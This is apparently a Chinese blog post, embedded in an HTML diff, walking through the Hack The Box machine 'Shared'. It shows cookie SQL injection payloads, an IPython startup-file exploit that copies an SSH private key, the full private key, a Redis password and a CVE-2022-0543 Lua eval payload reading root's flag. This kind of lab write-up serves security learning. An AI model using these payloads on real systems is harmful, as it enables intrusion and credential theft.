@@ -1,0 +1,212 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>HTB靶机：Shared | le0le</title><meta name="author" content="Le0le,2923336927@qq.com"><meta name="copyright" content="Le0le"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="HTB靶机：Shared靶机信息：这台靶机主要是涉及到ipython,redis提权。  信息收集：端口扫描：nmap -sC -sV -Pn 10.10.11.172  PORT    STATE SERVICE  VERSION22&#x2F;tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)| ssh-hostkey:|">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB靶机：Shared">
+<meta property="og:url" content="https://le623.github.io/2023/03/20/HTB%E9%9D%B6%E6%9C%BA%EF%BC%9AShared/index.html">
+<meta property="og:site_name" content="le0le">
+<meta property="og:description" content="HTB靶机：Shared靶机信息：这台靶机主要是涉及到ipython,redis提权。  信息收集：端口扫描：nmap -sC -sV -Pn 10.10.11.172  PORT    STATE SERVICE  VERSION22&#x2F;tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)| ssh-hostkey:|">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://le623.github.io/img/le0le.jpg">
+<meta property="article:published_time" content="2023-03-20T13:26:35.000Z">
+<meta property="article:modified_time" content="2023-03-20T13:27:38.739Z">
+<meta property="article:author" content="Le0le">
+<meta property="article:tag" content="HTB">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://le623.github.io/img/le0le.jpg"><link rel="shortcut icon" href="/img/le.jpg"><link rel="canonical" href="https://le623.github.io/2023/03/20/HTB%E9%9D%B6%E6%9C%BA%EF%BC%9AShared/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":1,"translateDelay":0,"msgToTraditionalChinese":"简","msgToSimplifiedChinese":"繁"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: Le0le","link":"链接: ","source":"来源: le0le","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'HTB靶机：Shared',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-03-20 21:27:38'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/le0le.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="le0le"><img class="site-icon" src="/img/le0le.jpg"/><span class="site-name">le0le</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">HTB靶机：Shared</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-03-20T13:26:35.000Z" title="发表于 2023-03-20 21:26:35">2023-03-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-03-20T13:27:38.739Z" title="更新于 2023-03-20 21:27:38">2023-03-20</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">938</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>4分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="HTB靶机：Shared"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="HTB靶机：Shared"><a href="#HTB靶机：Shared" class="headerlink" title="HTB靶机：Shared"></a>HTB靶机：Shared</h1><h2 id="靶机信息："><a href="#靶机信息：" class="headerlink" title="靶机信息："></a>靶机信息：</h2><p>这台靶机主要是涉及到<code>ipython</code>,<code>redis</code>提权。</p>
+<p><img src="https://s2.loli.net/2023/03/20/ofpuiq2aAY89hyF.png" alt="image-20221111142641705"></p>
+<h2 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h2><h3 id="端口扫描："><a href="#端口扫描：" class="headerlink" title="端口扫描："></a>端口扫描：</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -Pn 10.10.11.172</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">PORT</span>    <span class="string">STATE</span> <span class="string">SERVICE</span>  <span class="string">VERSION</span></span><br><span class="line"><span class="number">22</span><span class="string">/tcp</span>  <span class="string">open</span>  <span class="string">ssh</span>      <span class="string">OpenSSH</span> <span class="number">8.</span><span class="string">4p1</span> <span class="string">Debian</span> <span class="number">5</span><span class="string">+deb11u1</span> <span class="string">(protocol</span> <span class="number">2.0</span><span class="string">)</span></span><br><span class="line"><span class="string">|</span> <span class="attr">ssh-hostkey:</span></span><br><span class="line"><span class="string">|</span>   <span class="number">3072 </span><span class="number">91</span><span class="string">:e8:35:f4:69:5f:c2:e2:0e:27:46:e2:a6:b6:d8:65</span> <span class="string">(RSA)</span></span><br><span class="line"><span class="string">|</span>   <span class="number">256</span> <span class="string">cf:fc:c4:5d:84:fb:58:0b:be:2d:ad:35:40:9d:c3:51</span> <span class="string">(ECDSA)</span></span><br><span class="line"><span class="string">|_</span>  <span class="number">256</span> <span class="string">a3:38:6d:75:09:64:ed:70:cf:17:49:9a:dc:12:6d:11</span> <span class="string">(ED25519)</span></span><br><span class="line"><span class="number">80</span><span class="string">/tcp</span>  <span class="string">open</span>  <span class="string">http</span>     <span class="string">nginx</span> <span class="number">1.18</span><span class="number">.0</span></span><br><span class="line"><span class="string">|_http-title:</span> <span class="string">Did</span> <span class="string">not</span> <span class="string">follow</span> <span class="string">redirect</span> <span class="string">to</span> <span class="string">http://shared.htb</span></span><br><span class="line"><span class="string">|_http-server-header:</span> <span class="string">nginx/1.18.0</span></span><br><span class="line"><span class="number">443</span><span class="string">/tcp</span> <span class="string">open</span>  <span class="string">ssl/http</span> <span class="string">nginx</span> <span class="number">1.18</span><span class="number">.0</span></span><br><span class="line"><span class="string">|_http-title:</span> <span class="number">400</span> <span class="string">The</span> <span class="string">plain</span> <span class="string">HTTP</span> <span class="string">request</span> <span class="string">was</span> <span class="string">sent</span> <span class="string">to</span> <span class="string">HTTPS</span> <span class="string">port</span></span><br><span class="line"><span class="string">|</span> <span class="attr">ssl-cert: Subject:</span> <span class="string">commonName=*.shared.htb/organizationName=HTB/stateOrProvinceName=None/countryName=US</span></span><br><span class="line"><span class="string">|</span> <span class="attr">Not valid before:</span> <span class="number">2022-03-20T13:37:14</span></span><br><span class="line"><span class="string">|_Not</span> <span class="attr">valid after:</span>  <span class="number">2042-03-15T13:37:14</span></span><br><span class="line"><span class="string">|</span> <span class="attr">tls-nextprotoneg:</span></span><br><span class="line"><span class="string">|</span>   <span class="string">h2</span></span><br><span class="line"><span class="string">|_</span>  <span class="string">http/1.1</span></span><br><span class="line"><span class="string">|</span> <span class="attr">tls-alpn:</span></span><br><span class="line"><span class="string">|</span>   <span class="string">h2</span></span><br><span class="line"><span class="string">|_</span>  <span class="string">http/1.1</span></span><br><span class="line"><span class="string">|_ssl-date:</span> <span class="string">TLS</span> <span class="string">randomness</span> <span class="string">does</span> <span class="string">not</span> <span class="string">represent</span> <span class="string">time</span></span><br><span class="line"><span class="string">|_http-server-header:</span> <span class="string">nginx/1.18.0</span></span><br><span class="line"><span class="attr">Service Info: OS:</span> <span class="string">Linux;</span> <span class="attr">CPE:</span> <span class="string">cpe:/o:linux:linux_kernel</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="80"><a href="#80" class="headerlink" title="80:"></a>80:</h3><p>添加hosts访问：<code>shared.htb</code>是个商城。</p>
+<p><img src="https://s2.loli.net/2023/03/20/xTvzC2lBEkXADYa.png" alt="image-20221111143031795"></p>
+<h3 id="子域名扫描："><a href="#子域名扫描：" class="headerlink" title="子域名扫描："></a>子域名扫描：</h3><p>获取到<code>checkout.shared.htb</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://flight.htb</span><br></pre></td></tr></table></figure>
+
+<p>添加到hosts,访问，在第一个添加商品，这个就会出现该商品。</p>
+<p><img src="https://s2.loli.net/2023/03/20/UI5BJKWTojVktp7.png" alt="image-20221111143224912"></p>
+<h2 id="存在cookie-sql注入"><a href="#存在cookie-sql注入" class="headerlink" title="存在cookie-sql注入"></a>存在cookie-sql注入</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#测试，发现存在sql注入</span></span><br><span class="line">&#123;<span class="string">&quot;&#x27; and 0=1 union select 1,2,3-- -&quot;</span><span class="string">:&quot;1&quot;</span>&#125;</span><br><span class="line"><span class="comment">#列表名</span></span><br><span class="line">&#123;<span class="string">&quot;&#x27; and 0=1 union select 1,database(),3-- -&quot;</span><span class="string">:&quot;1&quot;</span>&#125;</span><br><span class="line"><span class="comment">#数据库</span></span><br><span class="line"><span class="string">checkout</span></span><br><span class="line"><span class="comment">#通过checkout表明查找表</span></span><br><span class="line">&#123;<span class="string">&quot;&#x27; and 0=1 union select 1,table_name,table_schema from information_schema.tables where table_schema=&#x27;checkout&#x27;-- -&quot;</span><span class="string">:&quot;1&quot;</span>&#125;</span><br><span class="line"><span class="comment">#表名</span></span><br><span class="line"><span class="string">user</span></span><br><span class="line"><span class="comment">#通过表找用户</span></span><br><span class="line">&#123;<span class="string">&quot;&#x27; and 0=1 union select 1,username,2 from checkout.user-- -&quot;</span><span class="string">:&quot;1&quot;</span>&#125;</span><br><span class="line"><span class="comment">#用户名</span></span><br><span class="line"><span class="string">james_mason</span></span><br><span class="line"><span class="comment">#密码</span></span><br><span class="line">&#123;<span class="string">&quot;&#x27; and 0=1 union select 1,password,2 from checkout.user-- -&quot;</span><span class="string">:&quot;1&quot;</span>&#125;</span><br><span class="line"><span class="comment">#密码</span></span><br><span class="line"><span class="string">fc895d4eddc2fc12f995e18c865cf273</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/03/20/nXDfcRwg5m3esTi.png" alt="image-20221111143550481"></p>
+<p><img src="https://s2.loli.net/2023/03/20/RA4BdipSzTPLHrt.png" alt="image-20221111144442792"></p>
+<p><img src="https://s2.loli.net/2023/03/20/xTHhMtLDE25WPCi.png" alt="image-20221111144532827"></p>
+<p>获取到<code>james_mason</code>:<code>Soleil101</code>.</p>
+<h2 id="user-txt"><a href="#user-txt" class="headerlink" title="user.txt"></a>user.txt</h2><p>尝试ssh登录。该用户在在<code>developer</code>组中.查看	<code>developer</code>有权限的文件，发现<code>scripts_review</code>目录,里面是空的。</p>
+<p>发现home下存在<code>dan_smith</code>用户</p>
+<p><img src="https://s2.loli.net/2023/03/20/8ClfX4eUwIbz2or.png" alt="image-20221111150148971"></p>
+<p><img src="https://s2.loli.net/2023/03/20/sly6vxV7gYNQ9jt.png" alt="image-20221111150913547"></p>
+<h3 id="pspy64"><a href="#pspy64" class="headerlink" title="pspy64:"></a>pspy64:</h3><p>运行pspy64,发现uid 1001用户进入这个目录后运行<code>ipython</code>.这里参考<code>ipython</code>提权</p>
+<p><img src="https://s2.loli.net/2023/03/20/nRzHba84feQto69.png" alt="image-20221111150624319"></p>
+<p>发现有现成的漏洞，这直接利用：<a target="_blank" rel="noopener" href="https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x">https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x</a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -m 777 profile_default</span><br><span class="line"><span class="built_in">mkdir</span> -m 777 profile_default/startup</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;import os; os.system(&#x27;cat ~/.ssh/id_rsa &gt; /tmp/key&#x27;)&quot;</span> &gt; profile_default/startup/foo.py</span><br></pre></td></tr></table></figure>
+
+<p>成功获取到<code>dan_smith</code>id_rsa</p>
+<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAvWFkzEQw9usImnZ7ZAzefm34r+54C9vbjymNl4pwxNJPaNSHbdWO</span><br><span class="line">+/+OPh0/KiPg70GdaFWhgm8qEfFXLEXUbnSMkiB7JbC3fCfDCGUYmp9QiiQC0xiFeaSbvZ</span><br><span class="line">FwA4NCZouzAW1W/ZXe60LaAXVAlEIbuGOVcNrVfh+XyXDFvEyre5BWNARQSarV5CGXk6ku</span><br><span class="line">sjib5U7vdKXASeoPSHmWzFismokfYy8Oyupd8y1WXA4jczt9qKUgBetVUDiai1ckFBePWl</span><br><span class="line">4G3yqQ2ghuHhDPBC+lCl3mMf1XJ7Jgm3sa+EuRPZFDCUiTCSxA8LsuYrWAwCtxJga31zWx</span><br><span class="line">FHAVThRwfKb4Qh2l9rXGtK6G05+DXWj+OAe/Q34gCMgFG4h3mPw7tRz2plTRBQfgLcrvVD</span><br><span class="line">oQtePOEc/XuVff+kQH7PU9J1c0F/hC7gbklm2bA8YTNlnCQ2Z2Z+HSzeEXD5rXtCA69F4E</span><br><span class="line">u1FCodLROALNPgrAM4LgMbD3xaW5BqZWrm24uP/lAAAFiPY2n2r2Np9qAAAAB3NzaC1yc2</span><br><span class="line">EAAAGBAL1hZMxEMPbrCJp2e2QM3n5t+K/ueAvb248pjZeKcMTST2jUh23Vjvv/jj4dPyoj</span><br><span class="line">4O9BnWhVoYJvKhHxVyxF1G50jJIgeyWwt3wnwwhlGJqfUIokAtMYhXmkm72RcAODQmaLsw</span><br><span class="line">FtVv2V3utC2gF1QJRCG7hjlXDa1X4fl8lwxbxMq3uQVjQEUEmq1eQhl5OpLrI4m+VO73Sl</span><br><span class="line">wEnqD0h5lsxYrJqJH2MvDsrqXfMtVlwOI3M7failIAXrVVA4motXJBQXj1peBt8qkNoIbh</span><br><span class="line">4QzwQvpQpd5jH9VyeyYJt7GvhLkT2RQwlIkwksQPC7LmK1gMArcSYGt9c1sRRwFU4UcHym</span><br><span class="line">+EIdpfa1xrSuhtOfg11o/jgHv0N+IAjIBRuId5j8O7Uc9qZU0QUH4C3K71Q6ELXjzhHP17</span><br><span class="line">lX3/pEB+z1PSdXNBf4Qu4G5JZtmwPGEzZZwkNmdmfh0s3hFw+a17QgOvReBLtRQqHS0TgC</span><br><span class="line">zT4KwDOC4DGw98WluQamVq5tuLj/5QAAAAMBAAEAAAGBAK05auPU9BzHO6Vd/tuzUci/ep</span><br><span class="line">wiOrhOMHSxA4y72w6NeIlg7Uev8gva5Bc41VAMZXEzyXFn8kXGvOqQoLYkYX1vKi13fG0r</span><br><span class="line">SYpNLH5/SpQUaa0R52uDoIN15+bsI1NzOsdlvSTvCIUIE1GKYrK2t41lMsnkfQsvf9zPtR</span><br><span class="line">1TA+uLDcgGbHNEBtR7aQ41E9rDA62NTjvfifResJZre/NFFIRyD9+C0az9nEBLRAhtTfMC</span><br><span class="line">E7cRkY0zDSmc6vpn7CTMXOQvdLao1WP2k/dSpwiIOWpSLIbpPHEKBEFDbKMeJ2G9uvxXtJ</span><br><span class="line">f3uQ14rvy+tRTog/B3/PgziSb6wvHri6ijt6N9PQnKURVlZbkx3yr397oVMCiTe2FA+I/Y</span><br><span class="line">pPtQxpmHjyClPWUsN45PwWF+D0ofLJishFH7ylAsOeDHsUVmhgOeRyywkDWFWMdz+Ke+XQ</span><br><span class="line">YWfa9RiI5aTaWdOrytt2l3Djd1V1/c62M1ekUoUrIuc5PS8JNlZQl7fyfMSZC9mL+iOQAA</span><br><span class="line">AMEAy6SuHvYofbEAD3MS4VxQ+uo7G4sU3JjAkyscViaAdEeLejvnn9i24sLWv9oE9/UOgm</span><br><span class="line">2AwUg3cT7kmKUdAvBHsj20uwv8a1ezFQNN5vxTnQPQLTiZoUIR7FDTOkQ0W3hfvjznKXTM</span><br><span class="line">wictz9NZYWpEZQAuSX2QJgBJc1WNOtrgJscNauv7MOtZYclqKJShDd/NHUGPnNasHiPjtN</span><br><span class="line">CRr7thGmZ6G9yEnXKkjZJ1Neh5Gfx31fQBaBd4XyVFsvUSphjNAAAAwQD4Yntc2zAbNSt6</span><br><span class="line">GhNb4pHYwMTPwV4DoXDk+wIKmU7qs94cn4o33PAA7ClZ3ddVt9FTkqIrIkKQNXLQIVI7EY</span><br><span class="line">Jg2H102ohz1lPWC9aLRFCDFz3bgBKluiS3N2SFbkGiQHZoT93qn612b+VOgX1qGjx1lZ/H</span><br><span class="line">I152QStTwcFPlJ0Wu6YIBcEq4Rc+iFqqQDq0z0MWhOHYvpcsycXk/hIlUhJNpExIs7TUKU</span><br><span class="line">SJyDK0JWt2oKPVhGA62iGGx2+cnGIoROcAAADBAMMvzNfUfamB1hdLrBS/9R+zEoOLUxbE</span><br><span class="line">SENrA1qkplhN/wPta/wDX0v9hX9i+2ygYSicVp6CtXpd9KPsG0JvERiVNbwWxD3gXcm0BE</span><br><span class="line">wMtlVDb4WN1SG5Cpyx9ZhkdU+t0gZ225YYNiyWob3IaZYWVkNkeijRD+ijEY4rN41hiHlW</span><br><span class="line">HPDeHZn0yt8fTeFAm+Ny4+<span class="number">8</span>+dLXMlZM5quPoa0zBbxzMZWpSI9E6j6rPWs2sJmBBEKVLQs</span><br><span class="line">tfJMvuTgb3NhHvUwAAAAtyb290QHNoYXJlZAECAwQFBg==</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+
+<p>登录<code>dan_smith</code>获取到user.txt</p>
+<p><img src="https://s2.loli.net/2023/03/20/Brm84bUGky7tFAd.png" alt="image-20221111151048816"></p>
+<h2 id="提权："><a href="#提权：" class="headerlink" title="提权："></a>提权：</h2><p>当前用户在sysadmin组，查找相关文件， 发现一个从redis获取信息的二进制文件，第一行输出表明了这个文件内置密码用于登录：</p>
+<p>这个二进制文件的机制是运行时使用内置密码连接本地redis，从中获取信息，如果我们把文件下载下来在本地运行，监听6379端口，可以很容易的获取密码：<code>F2WHqJUz2WEz=Gqq</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#使用scp下载目标文件</span></span><br><span class="line">scp -i id_rsa  dan_smith@10.10.11.172:/usr/local/bin/redis_connector_dev redis_connector_dev</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/03/20/EhsbXCrQYG8Dj4I.png" alt="image-20221111151527533"></p>
+<p><img src="https://s2.loli.net/2023/03/20/ucsOBCdTqUtzbRD.png" alt="image-20221111151724865"></p>
+<p>这里可以通过修改大佬的脚本直接提权：<a target="_blank" rel="noopener" href="https://github.com/aodsec/CVE-2022-0543">https://github.com/aodsec/CVE-2022-0543</a></p>
+<p>另外当前环境信息也符合CVE-2022-0543的条件，所以就是使用得到的密码连接，利用CVE-2022-0543执行任意命令</p>
+<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis">https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis</a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redis-cli --pass F2WHqJUz2WEz=Gqq</span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span> <span class="string">&#x27;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;cat /root/root.txt&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#x27;</span> 0</span><br></pre></td></tr></table></figure>
+
+<p>成功获取到root.txt,当然这里有人不嫌麻烦也可以弹一个shell.</p>
+<p><img src="https://s2.loli.net/2023/03/20/ImCAGlyzQLV1N65.png" alt="image-20221111152209894"></p>
+<h2 id="结尾："><a href="#结尾：" class="headerlink" title="结尾："></a>结尾：</h2><p>这台靶机就这俩提权点需要记一下。</p>
+<p><img src="https://s2.loli.net/2023/03/20/pYPK9c5l13VQEvh.png" alt="image-20221111152427357"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://le623.github.io">Le0le</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://le623.github.io/2023/03/20/HTB%E9%9D%B6%E6%9C%BA%EF%BC%9AShared/">https://le623.github.io/2023/03/20/HTB%E9%9D%B6%E6%9C%BA%EF%BC%9AShared/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://le623.github.io" target="_blank">le0le</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/HTB/">HTB</a></div><div class="post_share"><div class="social-share" data-image="/img/le0le.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/03/20/HTB%E9%9D%B6%E6%9C%BA%EF%BC%9AShoppy/" title="HTB靶机：Shoppy"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">HTB靶机：Shoppy</div></div></a></div><div class="next-post pull-right"><a href="/2023/03/20/HTB%E9%9D%B6%E6%9C%BA%EF%BC%9APhotobomb/" title="HTB靶机：Photobomb"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">HTB靶机：Photobomb</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/03/20/HTB%E9%9D%B6%E6%9C%BA%EF%BC%9AArmageddon/" title="HTB靶机：Armageddon"><div class="cover" style="background: var(--default-bg-color)"></div><div 